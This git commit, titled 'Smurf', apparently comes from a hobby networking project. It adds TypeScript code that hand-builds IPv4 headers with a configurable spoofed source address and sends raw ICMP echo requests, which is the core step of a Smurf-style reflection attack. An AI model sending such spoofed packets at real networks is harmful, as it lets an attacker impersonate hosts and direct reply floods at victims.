857ec9cc7782755dd7dbfd9a03c423038d790a07
Ivan Akulov <gxoptg@gmail.com>
2018-02-17 17:59:03 +0300

    Smurf

--- src/index.ts
+++ src/index.ts
@@ -1,39 +1,56 @@
 import 'dotenv/config';
 import * as raw from 'raw-socket';
-import { parseIpMessageFromBuffer } from './messages/ip';
+import {
+    parseIpMessageFromBuffer,
+    createBufferFromIpMessage,
+} from './messages/ip';
 import {
     createBufferFromPingMessage,
     parsePingMessageFromBuffer,
 } from './messages/ping';
+import { parseIcmpMessageFromBuffer } from './messages/icmp';
 
 const socket = raw.createSocket({
-    protocol: raw.Protocol.ICMP,
+    protocol: raw.Protocol.NONE,
     addressFamily: raw.AddressFamily.IPv4,
 });
 
 console.log(`Pinging ${process.env.IP_ADDRESS}...`);
 let sequenceNumber = 0;
 setInterval(() => {
-    const buffer = createBufferFromPingMessage({
+    const pingBuffer = createBufferFromPingMessage({
         identifier: 200,
         sequenceNumber,
     });
+    const ipBuffer = createBufferFromIpMessage({
+        identification: 0x1234,
+        sourceIp: process.env.SOURCE_IP_ADDRESS,
+        destinationIp: process.env.IP_ADDRESS,
+        ttl: 55,
+        protocol: raw.Protocol.ICMP,
+        data: pingBuffer,
+    });
+    socket.setOption(
+        raw.SocketLevel.IPPROTO_IP,
+        raw.SocketOption.IP_HDRINCL,
+        1,
+    );
     socket.send(
-        buffer,
+        ipBuffer,
         0,
-        buffer.length,
+        ipBuffer.length,
         process.env.IP_ADDRESS,
         () => {},
         () => {},
     );
 
     socket.once('message', (buffer: Buffer, source: string) => {
-        const ipMessage = parseIpMessageFromBuffer(buffer).data;
-        const pingMessage = parsePingMessageFromBuffer(ipMessage);
+        const ipMessage = parseIpMessageFromBuffer(buffer);
+        const icmpMessage = parseIcmpMessageFromBuffer(ipMessage.data);
         console.log(
-            `Received ${buffer.length} bytes from ${source}. Identifier is ${
-                pingMessage.identifier
-            }, sequence number is ${pingMessage.sequenceNumber}`,
+            `Received ${buffer.length} bytes from ${source}: type ${
+                icmpMessage.type
+            } · ${buffer.toString('hex')}`,
         );
     });
 
--- src/messages/ip.ts
+++ src/messages/ip.ts
@@ -1,11 +1,57 @@
+import * as raw from 'raw-socket';
+import { uint16ToBytes, bytesToUint16 } from '../uint16';
+
 interface IpMessage {
-    header: Buffer;
+    identification: number;
+    sourceIp: string;
+    destinationIp: string;
+    ttl: number;
+    protocol: number;
     data: Buffer;
 }
 
+export const createBufferFromIpMessage = ({
+    identification,
+    sourceIp,
+    destinationIp,
+    ttl,
+    protocol,
+    data,
+}: IpMessage): Buffer => {
+    const HEADER_LENGTH = 20;
+    const header = new Buffer([
+        // Version + IHL
+        0x45,
+        // DCSP + ESN
+        0x00,
+        // Total length
+        ...uint16ToBytes(HEADER_LENGTH + data.length),
+        // Identification
+        ...uint16ToBytes(identification),
+        // Flags + fragment offset
+        ...uint16ToBytes(0),
+        // TTL
+        ttl,
+        // Protocol
+        protocol,
+        // Header checksum (initially zeroed)
+        ...uint16ToBytes(0),
+        ...sourceIp.split('.').map(Number),
+        ...destinationIp.split('.').map(Number),
+    ]);
+
+    raw.writeChecksum(header, 10, raw.createChecksum(header));
+
+    return new Buffer([...header, ...data]);
+};
+
 export const parseIpMessageFromBuffer = (buffer: Buffer): IpMessage => {
     return {
-        header: buffer.slice(0, 20),
+        identification: bytesToUint16([...buffer.slice(4, 6)]),
+        sourceIp: [...buffer.slice(12, 16)].join('.'),
+        destinationIp: [...buffer.slice(16, 20)].join('.'),
+        ttl: buffer[8],
+        protocol: buffer[9],
         data: buffer.slice(20),
     };
 };
